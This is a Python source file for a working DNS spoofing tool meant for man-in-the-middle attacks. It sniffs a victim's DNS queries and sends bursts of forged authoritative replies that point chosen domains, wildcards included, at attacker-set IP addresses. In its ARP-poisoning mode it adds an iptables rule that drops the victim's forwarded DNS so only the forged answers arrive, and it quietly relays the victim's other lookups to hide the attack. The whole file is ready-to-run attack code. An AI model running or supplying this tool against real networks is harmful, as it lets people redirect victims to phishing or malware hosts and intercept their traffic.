"""
DNS Spoofing module for MITM attacks.

Supports two operational modes:
- DNS-only (race attack): Sniff DNS queries and race to respond before legitimate DNS server
- MITM mode: When ARP poisoning is active, victim sends DNS queries directly to attacker

Features:
- Load DNS rules from JSON file with domain → IP mappings
- Wildcard domain support (*.example.com)
- Thread-based background operation
- iptables rules to block forwarded DNS (ensures MITM mode reliability)
- DNS forwarding for non-spoofed domains in MITM mode
"""
# mypy: ignore-errors
from __future__ import annotations

import fnmatch
import json
import socket
import subprocess
import threading
from enum import Enum
from pathlib import Path
import click
from scapy.all import (  # pylint: disable=no-name-in-module,import-error
    DNS,
    DNSQR,
    DNSRR,
    IP,
    UDP,
    Ether,
    sendp,
    sniff,
    get_if_hwaddr,
    raw,
)
from scapy.error import Scapy_Exception
from network_utils import init_raw_socket, send_raw_packet


# Number of duplicate spoofed responses to send (helps win race conditions)
SPOOF_PACKET_COUNT = 5

# Upstream DNS server for forwarding non-spoofed queries
UPSTREAM_DNS = "8.8.8.8"
UPSTREAM_DNS_PORT = 53
DNS_TIMEOUT = 2.0


class DNSMode(Enum):
    """DNS spoofing operational modes."""
    RACE = "race"      # DNS-only: race against legitimate DNS server
    MITM = "mitm"      # ARP-DNS: victim sends DNS directly to us


def load_dns_rules(rules_path: str | Path) -> dict[str, dict[str, str]]:
    """
    Load DNS spoofing rules from a JSON file.
    Supports two formats:
    - Simple: {"domain": "ipv4"} - IPv4 only, AAAA returns empty
    - Full: {"domain": {"A": "ipv4", "AAAA": "ipv6"}} - Both record types
    """
    path = Path(rules_path)
    if not path.exists():
        raise FileNotFoundError(f"DNS rules file not found: {path}")

    with open(path, "r", encoding="utf-8") as f:
        rules = json.load(f)

    if not isinstance(rules, dict):
        raise ValueError("DNS rules must be a JSON object (dict)")

    normalized: dict[str, dict[str, str]] = {}
    for key, value in rules.items():
        domain = key.rstrip(".").lower()
        
        if isinstance(value, str):
            # Simple format: IPv4 only
            normalized[domain] = {"A": value, "AAAA": None}  # type: ignore
        elif isinstance(value, dict):
            # Full format with A and/or AAAA
            normalized[domain] = {
                "A": value.get("A"),
                "AAAA": value.get("AAAA"),
            }
        else:
            raise ValueError(f"Invalid rule format for {key}")

    return normalized


def match_domain(query_domain: str, rules: dict[str, dict[str, str]]) -> dict[str, str] | None:
    """Match a queried domain against DNS rules."""
    query_domain = query_domain.rstrip(".").lower()

    # Exact match
    if query_domain in rules:
        return rules[query_domain]

    # Wildcard match (*.example.com). Also match base domain (example.com).
    for pattern, record in rules.items():
        if not pattern.startswith("*."):
            continue

        if fnmatch.fnmatch(query_domain, pattern):
            return record

        base_domain = pattern[2:]
        if query_domain == base_domain:
            return record

    return None


class DNSSpoofer:
    """
    DNS Spoofer that runs as a background thread.

    Intercepts DNS queries and responds with spoofed IP addresses
    according to configured rules.
    """

    def __init__(
        self,
        iface: str,
        rules: dict[str, dict[str, str]],
        mode: DNSMode = DNSMode.RACE,
        victim_ip: str | None = None,
        gateway_ip: str | None = None,
    ):
        self.iface = iface
        self.rules = rules
        self.mode = mode
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip

        # Get our MAC address
        self.attacker_mac = get_if_hwaddr(iface)

        # Thread control
        self._running = False
        self._thread: threading.Thread | None = None
        
        # Track if we added iptables rules (for cleanup)
        self._iptables_rules_added = False
        
        # Raw socket for faster packet sending
        self._raw_socket: socket.socket | None = None
        self._raw_socket = init_raw_socket(iface)

    def _send_burst_async(self, packet_bytes: bytes, count: int) -> None:
        """Send remaining burst packets in background thread."""
        def burst():
            for _ in range(count):
                send_raw_packet(self._raw_socket, packet_bytes, self.iface)
        
        thread = threading.Thread(target=burst, daemon=True)
        thread.start()

    def _setup_iptables(self) -> None:
        """
        Set up iptables rules to intercept DNS traffic in MITM mode.
        
        In MITM mode, we need to:
        1. DROP forwarded DNS packets to the gateway (prevents kernel from forwarding)
        2. This gives our spoofer time to respond instead of racing the real DNS
        """
        if self.mode != DNSMode.MITM or not self.victim_ip or not self.gateway_ip:
            return
            
        try:
            # Drop DNS packets from victim that would be forwarded to gateway
            # This prevents the kernel from forwarding the DNS query before we can spoof
            cmd = [
                "iptables", "-I", "FORWARD", "1",
                "-s", self.victim_ip,
                "-d", self.gateway_ip,
                "-p", "udp", "--dport", "53",
                "-j", "DROP"
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            
            self._iptables_rules_added = True
            click.echo(f"[+] iptables: Blocking DNS forwarding from {self.victim_ip} to {self.gateway_ip}")
            
        except subprocess.CalledProcessError as e:
            click.echo(f"[!] Warning: Failed to set iptables rules: {e}")
            click.echo("[!] DNS spoofing may be unreliable (kernel may forward packets before we can spoof)")
        except FileNotFoundError:
            click.echo("[!] Warning: iptables not found, DNS spoofing may be unreliable")

    def _cleanup_iptables(self) -> None:
        """Remove iptables rules that were added during setup."""
        if not self._iptables_rules_added or not self.victim_ip or not self.gateway_ip:
            return
            
        try:
            cmd = [
                "iptables", "-D", "FORWARD",
                "-s", self.victim_ip,
                "-d", self.gateway_ip,
                "-p", "udp", "--dport", "53",
                "-j", "DROP"
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            click.echo("[+] iptables: Restored DNS forwarding rules")
            self._iptables_rules_added = False
        except subprocess.CalledProcessError:
            click.echo("[!] Warning: Failed to remove iptables rules")
        except FileNotFoundError:
            pass

    def _forward_dns_query(self, pkt) -> None:
        """
        Forward a DNS query to the upstream DNS server and relay response to victim.
        
        Used in MITM mode for domains we're not spoofing.
        """
        try:
            # Extract DNS query data
            dns_query = raw(pkt[DNS])
            
            # Forward to upstream DNS
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(DNS_TIMEOUT)
            sock.sendto(dns_query, (UPSTREAM_DNS, UPSTREAM_DNS_PORT))
            
            try:
                response_data, _ = sock.recvfrom(4096)
            except socket.timeout:
                click.echo("[!] DNS forward timeout for query")
                return
            finally:
                sock.close()
            
            # Build response packet to send back to victim
            # Ethernet: attacker MAC -> victim MAC
            # IP: gateway IP -> victim IP (so victim thinks response came from gateway)
            eth = Ether(src=self.attacker_mac, dst=pkt[Ether].src)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=53, dport=pkt[UDP].sport)
            
            # Parse the response and attach it
            dns_resp = DNS(response_data)
            
            response_pkt = eth / ip / udp / dns_resp
            sendp(response_pkt, iface=self.iface, verbose=False)
            
        except Exception as e:
            click.echo(f"[!] DNS forward error: {e}")

    def _build_dns_response(self, pkt, spoofed_ip: str | None, query_type: int = 1) -> Ether | None:
        """
        Build a spoofed DNS response packet.

        Args:
            pkt: Original DNS query packet
            spoofed_ip: IP address to return in response (IPv4 for A, IPv6 for AAAA)
            query_type: DNS query type (1=A, 28=AAAA)

        Returns:
            Crafted DNS response packet or None on error
        """
        try:
            if not pkt.haslayer(Ether) or not pkt.haslayer(IP) or not pkt.haslayer(UDP):
                return None

            query_name = pkt[DNSQR].qname

            # Build Ethernet layer
            eth = Ether(src=self.attacker_mac, dst=pkt[Ether].src)

            # Build IP layer (swap src/dst)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

            # Build UDP layer (swap ports)
            udp = UDP(sport=53, dport=pkt[UDP].sport)

            # Build DNS response based on query type
            if query_type == 28:  # AAAA query
                if spoofed_ip:
                    # Spoof with provided IPv6 address
                    dns = DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        rd=pkt[DNS].rd,
                        ra=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(
                            rrname=query_name,
                            type="AAAA",
                            ttl=300,
                            rdata=spoofed_ip,
                        ),
                    )
                else:
                    # Block IPv6: empty response (no answer section)
                    dns = DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        rd=pkt[DNS].rd,
                        ra=1,
                        qd=pkt[DNS].qd,
                        ancount=0,
                    )
            else:  # A query (type 1)
                dns = DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    rd=pkt[DNS].rd,
                    ra=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=query_name,
                        type="A",
                        ttl=300,
                        rdata=spoofed_ip,
                    ),
                )

            return eth / ip / udp / dns

        except (KeyError, IndexError, AttributeError, TypeError, ValueError) as e:
            click.echo(f"[!] Error building DNS response: {e}")
            return None

    def _handle_packet(self, pkt) -> None:
        """Process a captured DNS packet."""
        try:
            if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
                return

            if pkt[DNS].qr == 1:  # It's a response, not query
                return

            # Get query details
            qname = pkt[DNSQR].qname
            if isinstance(qname, bytes):
                qname = qname.decode(errors="ignore")
            qname = qname.rstrip(".")

            # In MITM mode, filter to only handle victim's queries
            if self.mode == DNSMode.MITM and self.victim_ip:
                if pkt[IP].src != self.victim_ip:
                    return

            # Get query type (1=A, 28=AAAA, etc.)
            query_type = pkt[DNSQR].qtype
            
            # Check if we should spoof this domain
            dns_records = match_domain(qname, self.rules)

            if dns_records is None:
                # No rule for this domain
                if self.mode == DNSMode.MITM:
                    # In MITM mode, we blocked forwarding, so we must forward manually
                    click.echo(f"[DNS] Forwarding {qname} to upstream DNS (no spoofing rule)")
                    self._forward_dns_query(pkt)
                # In RACE mode, do nothing - let the real DNS server respond
                return

            # Get spoofed IP for this query type
            if query_type == 28:  # AAAA (IPv6)
                spoofed_ip = dns_records.get("AAAA")
            elif query_type == 1:  # A (IPv4)
                spoofed_ip = dns_records.get("A")
                # If no A record configured, don't respond
                if not spoofed_ip:
                    return
            else:
                # Ignore other query types (MX, TXT, etc.) - let real DNS handle
                return

            # Build and send response (spoofed IP or empty for blocking)
            record_type = "AAAA" if query_type == 28 else "A"
            response = self._build_dns_response(pkt, spoofed_ip, query_type=query_type)
            if response is None:
                click.echo(f"[!] Failed to build DNS response for {qname}")
                return

            # Send the first packet immediately
            send_count = 1 if self.mode == DNSMode.MITM else SPOOF_PACKET_COUNT
            response_bytes = raw(response)
            send_raw_packet(self._raw_socket, response_bytes, self.iface)
            
            # Then send remaining packets asynchronously
            if send_count > 1:
                self._send_burst_async(response_bytes, send_count - 1)

            # Log action
            if spoofed_ip:
                click.echo(f"[DNS] Spoofed {record_type} {qname} -> {spoofed_ip} ({send_count}x)")
            else:
                click.echo(f"[DNS] Blocked {record_type} {qname} (empty response)")

        except (KeyError, IndexError, AttributeError, TypeError, ValueError, OSError) as e:
            click.echo(f"[!] Error handling DNS packet: {e}")

    def _build_filter(self) -> str:
        """Build BPF filter for DNS traffic."""
        bpf = "udp port 53"
        # Capture DNS queries from victim to gateway
        if self.victim_ip and self.gateway_ip:
            bpf = f"{bpf} and src host {self.victim_ip} and dst host {self.gateway_ip}"
        elif self.victim_ip:
            bpf = f"{bpf} and src host {self.victim_ip}"
        return bpf

    def _sniff_loop(self) -> None:
        """Main sniffing loop running in background thread."""
        bpf_filter = self._build_filter()
        click.echo(f"[+] DNS spoofer started in {self.mode.value.upper()} mode")
        click.echo(f"[+] Interface: {self.iface}, Filter: {bpf_filter}")
        click.echo(f"[+] Loaded {len(self.rules)} DNS spoofing rules")

        try:
            sniff(
                iface=self.iface,
                filter=bpf_filter,
                prn=self._handle_packet,
                store=False,
                stop_filter=lambda _: not self._running,
            )
        except (OSError, ValueError, Scapy_Exception) as e:
            click.echo(f"[!] DNS sniffer error: {e}")
        finally:
            click.echo("[*] DNS spoofer thread exiting.")

    def start(self) -> None:
        """Start DNS spoofing in a background thread."""
        if self._running:
            click.echo("[*] DNSSpoofer already running.")
            return

        # Set up iptables to block DNS forwarding (MITM mode only)
        self._setup_iptables()

        self._running = True
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Request DNS spoofing to stop."""
        if not self._running:
            return
        click.echo("[*] Stopping DNS spoofer...")
        self._running = False
        
        # Clean up iptables rules
        self._cleanup_iptables()
        
        # Close raw socket
        if self._raw_socket:
            try:
                self._raw_socket.close()
            except OSError:
                pass
            self._raw_socket = None

    def join(self, timeout: float | None = None) -> None:
        """Wait for the background thread to finish."""
        if self._thread is not None:
            self._thread.join(timeout)

    def is_running(self) -> bool:
        """Check if the spoofer is currently running."""
        return self._running


